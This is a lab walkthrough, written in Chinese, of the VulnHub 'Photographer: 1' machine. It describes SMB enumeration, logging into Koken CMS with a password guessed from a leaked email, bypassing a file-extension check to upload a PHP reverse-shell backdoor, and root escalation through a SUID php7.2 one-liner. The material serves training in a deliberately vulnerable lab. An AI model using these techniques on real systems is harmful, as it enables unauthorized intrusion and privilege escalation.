# Photographer: 1

2024-5-22 https://www.vulnhub.com/entry/photographer-1,519/

difficulty: Beginner / Intermediate

## IP

192.168.5.30

## Scan

Open Port -> 80,139,445,8000

```
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Photographer by v1n1v131r4
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: daisa ahomi
|_http-generator: Koken 0.22.24
```

先看看 SMB 有什么信息：

```
enum4linux -a 192.168.5.30

//192.168.5.30/sambashare	Mapping: OK Listing: OK Writing: N/A

smbclient //192.168.5.30/sambashare -N
```

发现 2 个文件: mailsent.txt 和 wordpress.bkp.zip

mailsent.txt 是一个邮件：

```
Message-ID: <4129F3CA.2020509@dc.edu>
Date: Mon, 20 Jul 2020 11:40:36 -0400
From: Agi Clarence <agi@photographer.com>
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hi Daisa!
Your site is ready now.
Don't forget your secret, my babygirl ;)
```

可能得到一个用户名 daisa，密码不知道，看看另外一个备份文件包有什么内容，配置文件中没看到密码信息。

直接看 80 的 web 服务吧，首页上好像发现了一个用户名 v1n1v131r4，源代码没看到信息，直接 gobuster 扫目录，也没看到什么隐藏信息，也没看到登陆页面。

在看看 8000 对应的 web 服务，看到底部的 CMS 版本为 Built with Koken，先寻找下 Koken 有没有什么漏洞可以利用。

找到了一个文件上传漏洞可以 RCE，https://www.exploit-db.com/exploits/48706 但是需要有登陆的用户凭据。

找到了 Koken 的登陆窗口，http://192.168.5.30:8000/admin/

需要以电子邮件登陆，看到上面的 mailsent.txt 中有电子邮件，daisa@photographer.com ，用这个当用户名，然后使用 babygirl 作为密码，看看能不能登陆。

结果能登陆成功，那么就可以利用前面发现的 upload 漏洞，上传 php 后门代码。

按照步骤，将后门代码文件修改名为 8888.php.jpg，使用 bp 进行拦截，在修改回 php 后缀。

先在 kali 上监听 8888 端口。http://192.168.5.30:8000/admin/#/library/content 右下角有 Import Content ，点击这个按钮，上传 8888.php.jpg，然后在 bp 中拦截，将文件名改成 8888.php，然后放开拦截，webshell 就会自动激活，然后就能得到反弹的 shell。

得到 shell 后，使用 python 升级 tty。

用户枚举：

```
www-data@photographer:/var/www/html$ cat /etc/passwd|grep bash
root:x:0:0:root:/root:/bin/bash
agi:x:1001:1001:,,,:/home/agi:/bin/bash
daisa:x:1000:1000:daisa:/home/osboxes:/bin/bash
```

得到了第一个 user flag：

```
www-data@photographer:/home/daisa$ cat user.txt
d41d8cd98f00b204e9800998ecf8427e
```

寻找提权到 root 的方法，suid 发现 /usr/bin/php7.2，进行利用：

`````
www-data@photographer:/home/daisa$ /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# cd /root
# cat proof.txt

                                .:/://::::///:-`
                            -/++:+`:--:o:  oo.-/+/:`
                         -++-.`o++s-y:/s: `sh:hy`:-/+:`
                       :o:``oyo/o`. `      ```/-so:+--+/`
                     -o:-`yh//.                 `./ys/-.o/
                    ++.-ys/:/y-                  /s-:/+/:/o`
                   o/ :yo-:hNN                   .MNs./+o--s`
                  ++ soh-/mMMN--.`            `.-/MMMd-o:+ -s
                 .y  /++:NMMMy-.``            ``-:hMMMmoss: +/
                 s-     hMMMN` shyo+:.    -/+syd+ :MMMMo     h
                 h     `MMMMMy./MMMMMd:  +mMMMMN--dMMMMd     s.
                 y     `MMMMMMd`/hdh+..+/.-ohdy--mMMMMMm     +-
                 h      dMMMMd:````  `mmNh   ```./NMMMMs     o.
                 y.     /MMMMNmmmmd/ `s-:o  sdmmmmMMMMN.     h`
                 :o      sMMMMMMMMs.        -hMMMMMMMM/     :o
                  s:     `sMMMMMMMo - . `. . hMMMMMMN+     `y`
                  `s-      +mMMMMMNhd+h/+h+dhMMMMMMd:     `s-
                   `s:    --.sNMMMMMMMMMMMMMMMMMMmo/.    -s.
                     /o.`ohd:`.odNMMMMMMMMMMMMNh+.:os/ `/o`
                      .++-`+y+/:`/ssdmmNNmNds+-/o-hh:-/o-
                        ./+:`:yh:dso/.+-++++ss+h++.:++-
                           -/+/-:-/y+/d:yh-o:+--/+/:`
                              `-///////////////:`


Follow me at: http://v1n1v131r4.com

d41d8cd98f00b204e9800998ecf8427e
`````
